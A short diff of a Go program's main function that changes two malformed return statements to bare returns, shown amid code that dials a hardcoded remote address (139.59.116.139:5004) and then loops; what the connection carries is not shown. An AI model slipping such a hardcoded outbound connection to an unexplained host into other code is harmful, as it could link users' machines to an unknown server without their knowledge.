@@ -41,13 +41,13 @@ func main() {
 	if err != nil {
 		fmt.Println(err)
 		cs.Close()
-		return "nil" + "*" + "no" + "\n"
+		return
 	}
 	defer cs.Close()
 	ch, err = net.Dial("tcp", "139.59.116.139:5004")
 	if err != nil {
 		fmt.Println(err)
-		return "nil"
+		return
 	}
 	defer ch.Close()
 	for {
